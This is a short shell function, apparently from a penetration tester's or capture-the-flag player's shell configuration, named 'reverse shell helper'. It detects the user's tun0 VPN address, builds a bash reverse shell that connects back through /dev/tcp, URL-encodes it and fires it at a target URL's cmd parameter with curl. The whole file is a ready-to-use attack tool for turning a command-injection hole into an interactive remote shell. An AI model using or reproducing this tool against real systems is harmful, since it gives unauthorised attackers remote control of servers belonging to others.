# ========================
# reverse shell helper
# ========================

rcecurl() {
  if [[ "$1" == "--help" || "$1" == "-h" ]]; then
    echo "usage: rcecurl <target_url> [port]"
    echo "send reverse shell via RCE (tun0 auto IP)"
    echo "default port: 4444"
    return 0
  fi

  local target="$1"
  local port="${2:-4444}"

  # tun0 IP auto detect
  local ip
  ip=$(ip -o -4 addr show tun0 2>/dev/null | awk '{print $4}' | cut -d/ -f1)

  if [[ -z "$ip" ]]; then
    echo "[-] tun0 IP not found"
    return 1
  fi

  local cmd="bash -c 'bash -i >& /dev/tcp/${ip}/${port} 0>&1'"

  local enc
  enc=$(python3 -c "import urllib.parse; print(urllib.parse.quote(\"$cmd\"))")

  curl "${target}?cmd=${enc}"
}

_rcecurl() {
  _arguments \
    '1:target url:_urls' \
    '2:port:(4444 5555 6666)'
}

compdef _rcecurl rcecurl
